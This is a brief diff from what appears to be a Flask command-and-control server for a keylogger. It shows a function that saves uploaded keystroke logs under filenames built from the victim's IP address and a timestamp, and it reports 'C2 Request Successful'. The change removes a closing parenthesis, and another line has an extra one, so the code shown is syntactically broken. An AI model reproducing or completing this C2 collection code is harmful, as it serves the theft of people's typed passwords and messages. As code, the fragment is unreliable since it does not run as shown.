@@ -21,7 +21,7 @@ def klog_collect():
 		##Remote Addr is logged from what flask recives from the request obj
 		##Timestamp is YY-MM-DDThh:mm:ss:
 		filename = getid_headers + b'_'+ bytes(request.remote_addr, encoding='utf-8') + b'_' +bytes(datetime.now().isoformat(timespec='seconds'), encoding='utf-8')
-		out = klog_file.save(KLOG_UPLOAD_DIR + filename.decode('utf-8'))
+		out = klog_file.save(KLOG_UPLOAD_DIR + filename.decode('utf-8')
 		if(out == None):
 			sys.stdout.write("\n[*]C2 Request Successful!\n"))
 			return "[*]C2 Request Successful!"
